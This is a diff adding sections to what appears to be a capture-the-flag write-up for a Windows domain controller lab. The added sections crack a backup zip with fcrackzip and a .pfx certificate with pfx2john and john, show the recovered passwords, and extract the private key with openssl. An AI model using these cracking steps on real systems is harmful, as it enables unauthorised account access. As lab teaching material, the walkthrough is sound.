@@ -122,6 +122,8 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
   winrm_backup seems interesting but its password protected.
   DOCX Files contain documentation about how passwords are managed arround the directory.
   
+### 3.Cracking ZIP:
+  
   lets try to crack the zip
    ```sh
    fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
@@ -130,7 +132,43 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
    PASSWORD FOUND!!!!: pw == supremelegacy
    ```
    Zip password was weak: supremelegacy
+   We obtain legacyy_dev_auth.pfx
    
+   
+
+### 3.Cracking pfx:
+  A quick Google search about extracting cert keys from pfx:
+  https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file
+  but we need to obtain the pfx key first so we are gonna try to crack it using john
+  Convert:
+  ```sh
+  pfx2john legacyy_dev_auth.pfx > pfx_john_legacy.hash
+  joh`n -w=/usr/share/wordlists/rockyou.txt pfx_john_legacy.hash 
+  ```
+  ```sh
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+thuglegacy       (legacyy_dev_auth.pfx)     
+1g 0:00:02:13 DONE (2022-06-13 04:00) 0.007506g/s 24256p/s 24256c/s 24256C/s thuglife03282006..thug209
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+  
+  
+   ```sh
+   openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.pem
+   ```
+   
+   
+  
+
+   
+   
+### 2.SMB Enumeration:
 
 
 
